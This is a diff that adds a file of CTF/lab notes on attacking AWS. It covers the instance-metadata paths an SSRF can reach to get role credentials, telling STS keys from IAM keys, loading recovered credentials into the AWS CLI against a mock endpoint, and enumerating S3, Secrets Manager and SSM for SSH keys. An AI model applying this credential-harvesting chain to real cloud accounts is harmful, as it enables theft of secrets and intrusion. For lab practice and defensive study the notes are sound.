@@ -1,0 +1,84 @@
+# topic: aws
+# desc: AWS exploitation in CTF/lab context — IMDS, credential typing, enumeration.
+
+## aws-imds-endpoints
+# tags: aws, imds, metadata, ssrf
+# desc: Key IMDS paths reachable via SSRF for role creds and instance data.
+The instance metadata service lives at 169.254.169.254. High-value paths:
+
+  /latest/meta-data/iam/security-credentials/         -> lists role name(s)
+  /latest/meta-data/iam/security-credentials/<role>   -> temp credential doc
+  /latest/meta-data/iam/info                          -> instance profile info
+  /latest/user-data                                   -> launch user-data
+                                                         (often seeded secrets)
+
+Enumerate the role name from the directory listing first, then append it
+to retrieve the credential document.
+
+## aws-credential-typing
+# tags: aws, credentials, sts, iam
+# desc: Distinguish temporary STS creds from long-term IAM keys by prefix.
+Access-key prefix tells you the credential type and what's required to
+use it:
+
+  ASIA...  = temporary STS session credentials.
+             REQUIRES the session token (AWS_SESSION_TOKEN). Time-limited
+             (see Expiration). Typical of an IMDS-role / assumed-role mock.
+  AKIA...  = long-term IAM user credentials.
+             No session token. Persist until rotated.
+
+If a credential doc has a "Token" field and an "Expiration", it is STS;
+you must carry the token through every call.
+
+## aws-cli-profile-setup
+# tags: aws, awscli, credentials, setup
+# desc: Load a recovered STS triplet into the CLI (profile or env vars).
+Profile form (persists to ~/.aws/credentials and ~/.aws/config):
+
+  aws configure set aws_access_key_id <AKID> --profile lab
+  aws configure set aws_secret_access_key '<SECRET>' --profile lab
+  aws configure set aws_session_token '<TOKEN>' --profile lab
+
+Env-var form (nothing written to disk — preferred for throwaway creds):
+
+  export AWS_ACCESS_KEY_ID=<AKID>
+  export AWS_SECRET_ACCESS_KEY='<SECRET>'
+  export AWS_SESSION_TOKEN='<TOKEN>'   # required for ASIA/STS
+
+If the CLI prompts for a region with no region in the creds, set any
+valid placeholder (e.g. us-east-1) — mocks usually ignore it.
+
+## aws-mock-endpoint
+# tags: aws, awscli, endpoint, lab, localstack
+# desc: Redirect the CLI off real AWS onto a box's mock service.
+Lab/CTF AWS is a mock (localstack-style), not real AWS. Use
+--endpoint-url to point the CLI at the box's AWS vhost/IP. Verify creds
+before enumerating:
+
+  aws --profile lab --endpoint-url http://aws.<box>.htb sts get-caller-identity
+
+If the vhost 403s the CLI the way it 403'd the browser, try the IP, and
+confirm the Host header the mock expects. Some mocks are only reachable
+through the SSRF itself (SigV4-by-hand is painful — get the CLI talking
+to the endpoint if at all possible).
+
+## aws-post-cred-enumeration
+# tags: aws, enumeration, s3, secretsmanager, ssm
+# desc: Service-enumeration order after obtaining working credentials.
+Once sts get-caller-identity succeeds, enumerate the stores most likely
+to hold the next artifact, in priority order:
+
+  # S3 — buckets often hold the next credential, a backup, or an SSH key
+  aws --endpoint-url <ep> s3 ls
+  aws --endpoint-url <ep> s3 ls s3://<bucket> --recursive
+
+  # Secrets Manager — themed credential stores
+  aws --endpoint-url <ep> secretsmanager list-secrets
+  aws --endpoint-url <ep> secretsmanager get-secret-value --secret-id <name>
+
+  # SSM Parameter Store — another common secret stash
+  aws --endpoint-url <ep> ssm describe-parameters
+  aws --endpoint-url <ep> ssm get-parameters-by-path --path / --recursive --with-decryption
+
+Grep results for chain hints: marcus, ssh, id_rsa, private, key. Typical
+chain: IMDS creds -> S3/Secrets/SSM -> SSH private key -> shell foothold.
